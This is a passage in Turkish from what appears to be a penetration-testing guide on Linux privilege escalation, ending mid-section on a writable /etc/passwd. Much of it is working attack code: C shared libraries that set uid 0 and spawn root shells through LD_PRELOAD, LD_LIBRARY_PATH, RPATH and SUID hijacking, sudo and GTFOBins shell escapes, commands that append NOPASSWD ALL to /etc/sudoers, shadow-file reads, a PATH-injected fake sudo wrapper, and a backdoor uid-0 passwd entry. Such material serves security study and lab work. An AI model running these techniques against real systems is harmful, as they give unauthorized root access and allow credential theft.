`/etc/dbus-1/system.d/wpa_supplicant.conf` dosyasında, root kullanıcısının `fi.w1.wpa_supplicant1`'den mesaj alması, göndermesi ve sahip olması için izinleri detaylandıran bir politika örneği sağlanmıştır.

Belirtilmiş bir kullanıcı veya grup içermeyen politikalar evrensel olarak uygulanırken, "varsayılan" bağlam politikaları, diğer belirli politikalarla kapsanmayan tüm durumlara uygulanır.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**D-Bus iletişimini nasıl listeleyeceğinizi ve istismar edeceğinizi burada öğrenin:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Ağ**

Ağı listelemek ve makinenin konumunu belirlemek her zaman ilginçtir.

### Genel listeleme
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Açık portlar

Erişim sağlamadan önce etkileşimde bulunamadığınız makinede çalışan ağ hizmetlerini her zaman kontrol edin:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Trafiği dinleyip dinleyemeyeceğinizi kontrol edin. Eğer dinleyebiliyorsanız, bazı kimlik bilgilerini yakalayabilirsiniz.
```
timeout 1 tcpdump
```
## Kullanıcılar

### Genel Sayım

**Kim** olduğunuzu, hangi **yetkilere** sahip olduğunuzu, sistemlerde hangi **kullanıcıların** bulunduğunu, hangilerinin **giriş yapabileceğini** ve hangilerinin **root yetkilerine** sahip olduğunu kontrol edin:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Bazı Linux sürümleri, **UID > INT_MAX** olan kullanıcıların ayrıcalıkları artırmasına izin veren bir hatadan etkilenmiştir. Daha fazla bilgi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) ve [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Bunu kullanarak istismar et**: **`systemd-run -t /bin/bash`**

### Groups

Kök ayrıcalıkları verebilecek **bir grubun üyesi olup olmadığınızı** kontrol edin:

{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Pano içinde ilginç bir şey olup olmadığını kontrol edin (mümkünse)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Şifre Politikası
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bilinen şifreler

Eğer **ortamın herhangi bir şifresini biliyorsanız**, şifreyi kullanarak **her kullanıcı olarak giriş yapmayı deneyin**.

### Su Brute

Eğer çok fazla gürültü yapmaktan rahatsız değilseniz ve `su` ile `timeout` ikili dosyaları bilgisayarda mevcutsa, kullanıcıyı [su-bruteforce](https://github.com/carlospolop/su-bruteforce) kullanarak brute-force ile denemeyi deneyebilirsiniz.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parametresi ile kullanıcıları brute-force ile denemeye de çalışır.

## Yazılabilir PATH istismarları

### $PATH

Eğer **$PATH'in bazı klasörlerine yazma izniniz olduğunu** bulursanız, **yazılabilir klasörde** farklı bir kullanıcı (ideali root) tarafından çalıştırılacak bir komutun adıyla bir arka kapı oluşturarak ayrıcalıkları artırma şansınız olabilir ve bu komut **yazılabilir klasörünüzden önceki** bir klasörden yüklenmiyor olmalıdır.

### SUDO ve SUID

Bazı komutları sudo kullanarak çalıştırmanıza izin verilebilir veya suid biti olabilir. Bunu kontrol etmek için:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Bazı **beklenmedik komutlar, dosyaları okumanıza ve/veya yazmanıza veya hatta bir komut çalıştırmanıza olanak tanır.** Örneğin:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo yapılandırması, bir kullanıcının başka bir kullanıcının ayrıcalıklarıyla bazı komutları şifreyi bilmeden çalıştırmasına izin verebilir.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Bu örnekte `demo` kullanıcısı `vim`'i `root` olarak çalıştırabilir, artık bir ssh anahtarı ekleyerek veya `sh` çağırarak bir shell almak çok basit.
```
sudo vim -c '!sh'
```
### SETENV

Bu yönerge, kullanıcının bir şeyi yürütürken **bir ortam değişkeni ayarlamasına** olanak tanır:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Bu örnek, **HTB makinesi Admirer** üzerine **PYTHONPATH kaçırma** ile bir python kütüphanesini yüklemek için kök olarak scripti çalıştırırken **açık** idi:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo yürütme atlama yolları

**Diğer dosyaları okumak için atlayın** veya **sembolik bağlantılar** kullanın. Örneğin sudoers dosyasında: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Eğer bir **wildcard** kullanılıyorsa (\*), bu daha da kolaydır:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Karşı Önlemler**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo komutu/SUID ikili dosyası komut yolu olmadan

Eğer **sudo izni** tek bir komuta **yol belirtilmeden** verilmişse: _hacker10 ALL= (root) less_ bunu PATH değişkenini değiştirerek istismar edebilirsiniz.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Bu teknik, bir **suid** ikili dosyası **yolu belirtmeden başka bir komut çalıştırıyorsa (her zaman garip bir SUID ikilisinin içeriğini kontrol etmek için** _**strings**_ **kullanın)** durumunda da kullanılabilir.

[Çalıştırılacak yük örnekleri.](payloads-to-execute.md)

### Komut yolu ile SUID ikili dosyası

Eğer **suid** ikili dosyası **yolu belirterek başka bir komut çalıştırıyorsa**, o zaman, suid dosyasının çağırdığı komutla aynı adı taşıyan bir **fonksiyonu dışa aktarmayı** deneyebilirsiniz.

Örneğin, eğer bir suid ikili dosyası _**/usr/sbin/service apache2 start**_ komutunu çağırıyorsa, fonksiyonu oluşturmayı ve dışa aktarmayı denemelisiniz:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Sonra, suid ikili dosyasını çağırdığınızda, bu fonksiyon çalıştırılacaktır.

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** ortam değişkeni, yükleyici tarafından diğer tüm kütüphanelerden önce yüklenmesi gereken bir veya daha fazla paylaşılan kütüphaneyi (.so dosyaları) belirtmek için kullanılır. Bu işlem, bir kütüphanenin ön yüklenmesi olarak bilinir.

Ancak, sistem güvenliğini korumak ve bu özelliğin özellikle **suid/sgid** yürütülebilir dosyalarla istismar edilmesini önlemek için, sistem belirli koşulları zorunlu kılar:

- Yükleyici, gerçek kullanıcı kimliği (_ruid_) etkili kullanıcı kimliği (_euid_) ile eşleşmeyen yürütülebilir dosyalar için **LD_PRELOAD**'u dikkate almaz.
- Suid/sgid olan yürütülebilir dosyalar için yalnızca standart yollardaki ve aynı zamanda suid/sgid olan kütüphaneler ön yüklenir.

Yetki yükseltme, `sudo` ile komutları çalıştırma yeteneğiniz varsa ve `sudo -l` çıktısı **env_keep+=LD_PRELOAD** ifadesini içeriyorsa gerçekleşebilir. Bu yapılandırma, **LD_PRELOAD** ortam değişkeninin kalıcı olmasını ve `sudo` ile komutlar çalıştırıldığında tanınmasını sağlar, bu da potansiyel olarak yükseltilmiş ayrıcalıklarla rastgele kodun çalıştırılmasına yol açabilir.
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** olarak kaydedin
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Sonra **derleyin**:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Sonunda, **yetkileri yükseltin** çalıştırarak
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Benzer bir privesc, saldırgan **LD_LIBRARY_PATH** env değişkenini kontrol ediyorsa kötüye kullanılabilir çünkü kütüphanelerin aranacağı yolu kontrol eder.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID İkili – .so enjeksiyonu

**SUID** izinlerine sahip ve alışılmadık görünen bir ikili ile karşılaşıldığında, **.so** dosyalarını düzgün bir şekilde yükleyip yüklemediğini kontrol etmek iyi bir uygulamadır. Bu, aşağıdaki komut çalıştırılarak kontrol edilebilir:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Örneğin, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ gibi bir hata ile karşılaşmak, bir istismar potansiyelini gösterir.

Bunu istismar etmek için, _"/path/to/.config/libcalc.c"_ adında bir C dosyası oluşturulmalı ve aşağıdaki kod eklenmelidir:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Bu kod, derlendikten ve çalıştırıldıktan sonra, dosya izinlerini manipüle ederek ve yükseltilmiş ayrıcalıklarla bir shell çalıştırarak ayrıcalıkları artırmayı amaçlamaktadır.

Yukarıdaki C dosyasını bir paylaşılan nesne (.so) dosyasına derlemek için:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Sonunda, etkilenen SUID ikili dosyasını çalıştırmak, potansiyel sistem ihlali için istismarı tetikleyecektir.

## Paylaşılan Nesne Kaçırma
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Artık yazabileceğimiz bir klasörden bir kütüphane yükleyen bir SUID ikili dosyası bulduğumuza göre, o klasörde gerekli isimle kütüphaneyi oluşturalım:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Eğer şu hatayı alırsanız
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
bu, oluşturduğunuz kütüphanenin `a_function_name` adında bir işlev içermesi gerektiği anlamına gelir.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io), bir saldırganın yerel güvenlik kısıtlamalarını aşmak için istismar edebileceği Unix ikili dosyalarının derlenmiş bir listesidir. [**GTFOArgs**](https://gtfoargs.github.io/) ise yalnızca bir komuta **argüman enjekte edebileceğiniz** durumlar için aynıdır.

Proje, kısıtlı shell'lerden çıkmak, ayrıcalıkları yükseltmek veya sürdürmek, dosya transferi yapmak, bind ve reverse shell'ler oluşturmak ve diğer post-exploitation görevlerini kolaylaştırmak için kötüye kullanılabilecek Unix ikili dosyalarının meşru işlevlerini toplar.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}

{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Eğer `sudo -l` erişiminiz varsa, herhangi bir sudo kuralını istismar etmenin yolunu bulup bulmadığını kontrol etmek için [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) aracını kullanabilirsiniz.

### Sudo Token'larını Yeniden Kullanma

Eğer **sudo erişiminiz** varsa ama şifreniz yoksa, **bir sudo komutunun yürütülmesini bekleyerek ve ardından oturum token'ını ele geçirerek** ayrıcalıkları yükseltebilirsiniz.

Ayrıcalıkları yükseltmek için gereksinimler:

- Zaten "_sampleuser_" kullanıcısı olarak bir shell'e sahipsiniz
- "_sampleuser_" son **15 dakikada** bir şey yürütmek için **`sudo` kullanmış** (varsayılan olarak bu, şifre girmeden `sudo` kullanmamıza izin veren sudo token'ının süresidir)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0
- `gdb` erişilebilir (yükleyebilmeniz gerekir)

(`ptrace_scope`'u geçici olarak `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ile etkinleştirebilir veya `/etc/sysctl.d/10-ptrace.conf` dosyasını kalıcı olarak değiştirip `kernel.yama.ptrace_scope = 0` ayarını yapabilirsiniz)

Tüm bu gereksinimler karşılandığında, **şu şekilde ayrıcalıkları yükseltebilirsiniz:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **ilk istismar** (`exploit.sh`), _/tmp_ dizininde `activate_sudo_token` adlı ikili dosyayı oluşturacaktır. Bunu **oturumunuzda sudo token'ını etkinleştirmek için** kullanabilirsiniz (otomatik olarak bir root shell almayacaksınız, `sudo su` yapın):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **İkinci istismar** (`exploit_v2.sh`), _/tmp_ içinde **setuid ile root'a ait** bir sh shell oluşturacaktır.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Üçüncü exploit (`exploit_v3.sh`), **sudo token'larını sonsuz hale getiren ve tüm kullanıcıların sudo kullanmasına izin veren bir sudoers dosyası oluşturacaktır.**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Kullanıcı Adı>

Eğer klasörde veya klasör içindeki oluşturulan dosyalardan herhangi birinde **yazma izinleriniz** varsa, bir kullanıcı ve PID için **sudo token** oluşturmak üzere [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ikili dosyasını kullanabilirsiniz.\
Örneğin, _/var/run/sudo/ts/sampleuser_ dosyasını üzerine yazabiliyorsanız ve o kullanıcı olarak PID 1234 ile bir shell'e sahipseniz, şifreyi bilmeden **sudo ayrıcalıkları** elde edebilirsiniz:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Dosya `/etc/sudoers` ve `/etc/sudoers.d` içindeki dosyalar, kimin `sudo` kullanabileceğini ve nasıl kullanılacağını yapılandırır. Bu dosyalar **varsayılan olarak yalnızca root kullanıcısı ve root grubu tarafından okunabilir**.\
**Eğer** bu dosyayı **okuyabiliyorsanız**, bazı **ilginç bilgilere ulaşabilirsiniz** ve eğer herhangi bir dosyayı **yazabiliyorsanız**, **yetkileri yükseltebilirsiniz**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Eğer yazabiliyorsanız, bu izni kötüye kullanabilirsiniz.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Bu izinleri kötüye kullanmanın bir başka yolu:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` ikili dosyasına alternatif olarak OpenBSD için `doas` gibi bazı alternatifler vardır, yapılandırmasını `/etc/doas.conf` dosyasında kontrol etmeyi unutmayın.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Eğer bir **kullanıcının genellikle bir makineye bağlandığını ve `sudo` kullanarak yetkileri artırdığını** biliyorsanız ve o kullanıcı bağlamında bir shell elde ettiyseniz, **kendi kodunuzu root olarak çalıştıracak yeni bir sudo yürütülebilir dosya** oluşturabilirsiniz ve ardından kullanıcının komutunu çalıştırabilirsiniz. Sonra, **kullanıcı bağlamının $PATH'ini** değiştirin (örneğin, .bash_profile'a yeni yolu ekleyerek) böylece kullanıcı sudo'yu çalıştırdığında, sizin sudo yürütülebilir dosyanız çalıştırılır.

Kullanıcının farklı bir shell (bash değil) kullanması durumunda, yeni yolu eklemek için diğer dosyaları da değiştirmeniz gerekecektir. Örneğin, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` dosyalarını değiştirir. Başka bir örneği [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) içinde bulabilirsiniz.

Ya da şöyle bir şey çalıştırarak:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Paylaşılan Kütüphane

### ld.so

Dosya `/etc/ld.so.conf`, **yüklenen yapılandırma dosyalarının nereden geldiğini** gösterir. Genellikle, bu dosya aşağıdaki yolu içerir: `include /etc/ld.so.conf.d/*.conf`

Bu, `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyalarının okunacağı anlamına gelir. Bu yapılandırma dosyaları, **kütüphanelerin** **arama** yapılacağı **diğer klasörlere** işaret eder. Örneğin, `/etc/ld.so.conf.d/libc.conf` dosyasının içeriği `/usr/local/lib`'dır. **Bu, sistemin `/usr/local/lib` içinde kütüphaneleri arayacağı anlamına gelir.**

Eğer bir nedenle **bir kullanıcının yazma izinleri** belirtilen yollardan herhangi birinde varsa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` içindeki herhangi bir dosya veya `/etc/ld.so.conf.d/*.conf` içindeki yapılandırma dosyası içindeki herhangi bir klasör, yetkileri yükseltebilir.\
Aşağıdaki sayfada **bu yanlış yapılandırmayı nasıl istismar edeceğinize** bir göz atın:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
`lib`'i `/var/tmp/flag15/` içine kopyalayarak, `RPATH` değişkeninde belirtildiği gibi program tarafından bu yerde kullanılacaktır.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Ardından `/var/tmp` dizininde `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` komutunu kullanarak kötü niyetli bir kütüphane oluşturun.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Yetenekler

Linux yetenekleri, bir **işleme mevcut root ayrıcalıklarının bir alt kümesini** sağlar. Bu, root **ayrıcalıklarını daha küçük ve belirgin birimlere** ayırır. Bu birimlerin her biri, işlemlere bağımsız olarak verilebilir. Bu şekilde, ayrıcalıkların tam seti azaltılır ve istismar riskleri düşer.\
Daha fazla bilgi için **yetenekler ve bunların nasıl kötüye kullanılacağı hakkında** aşağıdaki sayfayı okuyun:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Dizin izinleri

Bir dizinde, **"çalıştır"** biti, etkilenen kullanıcının **dizine "cd"** yapabileceğini belirtir.\
**"okuma"** biti, kullanıcının **dosyaları listeleyebileceğini**, **"yazma"** biti ise kullanıcının **dosyaları silip** **yeni dosyalar** **oluşturabileceğini** belirtir.

## ACL'ler

Erişim Kontrol Listeleri (ACL'ler), **geleneksel ugo/rwx izinlerini geçersiz kılabilen** isteğe bağlı izinlerin ikinci katmanını temsil eder. Bu izinler, dosya veya dizin erişimi üzerinde kontrolü artırarak, sahip olmayan veya grup üyesi olmayan belirli kullanıcılara haklar vererek veya reddederek daha fazla kontrol sağlar. Bu düzeydeki **ince ayrıntı, daha hassas erişim yönetimi sağlar**. Daha fazla ayrıntı [**burada**](https://linuxconfig.org/how-to-manage-acls-on-linux) bulunabilir.

**kali** kullanıcısına bir dosya üzerinde okuma ve yazma izinleri verin:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Belirli ACL'lere** sahip dosyaları sistemden alın:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Açık shell oturumları

**Eski sürümlerde** farklı bir kullanıcının (**root**) bazı **shell** oturumlarını **ele geçirebilirsiniz**.\
**En yeni sürümlerde** yalnızca **kendi kullanıcınızın** ekran oturumlarına **bağlanabileceksiniz**. Ancak, **oturum içinde ilginç bilgiler** bulabilirsiniz.

### ekran oturumlarını ele geçirme

**Ekran oturumlarını listele**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Bir oturuma bağlan**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux oturumlarının ele geçirilmesi

Bu, **eski tmux sürümleriyle** ilgili bir sorundu. Bir ayrıcalıksız kullanıcı olarak root tarafından oluşturulan bir tmux (v2.1) oturumunu ele geçiremedim.

**tmux oturumlarını listele**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Bir oturuma bağlan**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Eylül 2006 ile 13 Mayıs 2008 arasında Debian tabanlı sistemlerde (Ubuntu, Kubuntu, vb.) üretilen tüm SSL ve SSH anahtarları bu hatadan etkilenebilir.\
Bu hata, bu işletim sistemlerinde yeni bir ssh anahtarı oluşturulurken meydana gelir, çünkü **yalnızca 32,768 varyasyon mümkündü**. Bu, tüm olasılıkların hesaplanabileceği anlamına gelir ve **ssh genel anahtarına sahip olduğunuzda, karşılık gelen özel anahtarı arayabilirsiniz**. Hesaplanan olasılıkları burada bulabilirsiniz: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH İlginç yapılandırma değerleri

- **PasswordAuthentication:** Parola kimlik doğrulamasının izin verilip verilmediğini belirtir. Varsayılan `no`'dur.
- **PubkeyAuthentication:** Genel anahtar kimlik doğrulamasının izin verilip verilmediğini belirtir. Varsayılan `yes`'dir.
- **PermitEmptyPasswords**: Parola kimlik doğrulamasına izin verildiğinde, sunucunun boş parola dizelerine sahip hesaplara girişe izin verip vermediğini belirtir. Varsayılan `no`'dur.

### PermitRootLogin

Root'un ssh kullanarak giriş yapıp yapamayacağını belirtir, varsayılan `no`'dur. Olası değerler:

- `yes`: root parola ve özel anahtar kullanarak giriş yapabilir
- `without-password` veya `prohibit-password`: root yalnızca özel anahtar ile giriş yapabilir
- `forced-commands-only`: Root yalnızca özel anahtar kullanarak ve komut seçenekleri belirtilmişse giriş yapabilir
- `no` : hayır

### AuthorizedKeysFile

Kullanıcı kimlik doğrulaması için kullanılabilecek genel anahtarları içeren dosyaları belirtir. `%h` gibi token'lar içerebilir, bu da ev dizini ile değiştirilir. **Kesin yolları belirtebilirsiniz** ( `/` ile başlayan) veya **kullanıcının evinden göreli yolları** belirtebilirsiniz. Örneğin:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Bu yapılandırma, "**testusername**" kullanıcısının **özel** anahtarıyla giriş yapmaya çalıştığınızda, ssh'nın anahtarınızdaki genel anahtarı `/home/testusername/.ssh/authorized_keys` ve `/home/testusername/access` konumlarındaki anahtarlarla karşılaştıracağını gösterecektir.

### ForwardAgent/AllowAgentForwarding

SSH ajan yönlendirmesi, **şifreli olmayan** anahtarların sunucunuzda kalması yerine **yerel SSH anahtarlarınızı kullanmanıza** olanak tanır. Böylece, ssh ile **bir ana bilgisayara** **atlayabilir** ve oradan **başka bir** ana bilgisayara **atlayabilirsiniz** **ilk ana bilgisayarınızdaki** **anahtarı** kullanarak.

Bu seçeneği `$HOME/.ssh.config` dosyasında şu şekilde ayarlamanız gerekir:
```
Host example.com
ForwardAgent yes
```
Dikkat edin ki, eğer `Host` `*` ise, kullanıcı farklı bir makineye geçtiğinde, o host anahtarları erişebilecektir (bu bir güvenlik sorunudur).

Dosya `/etc/ssh_config` bu **seçenekleri** **geçersiz kılabilir** ve bu yapılandırmayı izin verebilir veya reddedebilir.\
Dosya `/etc/sshd_config` `AllowAgentForwarding` anahtar kelimesi ile ssh-agent yönlendirmesine **izin verebilir** veya **reddedebilir** (varsayılan izin ver).

Eğer bir ortamda Forward Agent'ın yapılandırıldığını bulursanız, **yetkileri artırmak için bunu kötüye kullanabileceğinizden** aşağıdaki sayfayı okuyun:

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## İlginç Dosyalar

### Profiller dosyaları

Dosya `/etc/profile` ve `/etc/profile.d/` altındaki dosyalar, **bir kullanıcı yeni bir shell çalıştırdığında yürütülen betiklerdir**. Bu nedenle, eğer bunlardan herhangi birini **yazabilir veya değiştirebilirseniz, yetkileri artırabilirsiniz**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Eğer herhangi bir garip profil betiği bulunursa, **hassas detaylar** için kontrol etmelisiniz.

### Passwd/Shadow Dosyaları

İşletim sistemine bağlı olarak, `/etc/passwd` ve `/etc/shadow` dosyaları farklı bir isim kullanıyor olabilir veya bir yedeği olabilir. Bu nedenle, **hepsini bulmanız** ve **okuyup okuyamayacağınızı kontrol etmeniz** önerilir; dosyaların içinde **hash'ler** olup olmadığını görmek için:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Bazı durumlarda **şifre karma değerlerini** `/etc/passwd` (veya eşdeğeri) dosyası içinde bulabilirsiniz.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Yazılabilir /etc/passwd

Öncelikle, aşağıdaki komutlardan biriyle bir şifre oluşturun.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Sonra `hacker` kullanıcısını ekleyin ve oluşturulan şifreyi ekleyin.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
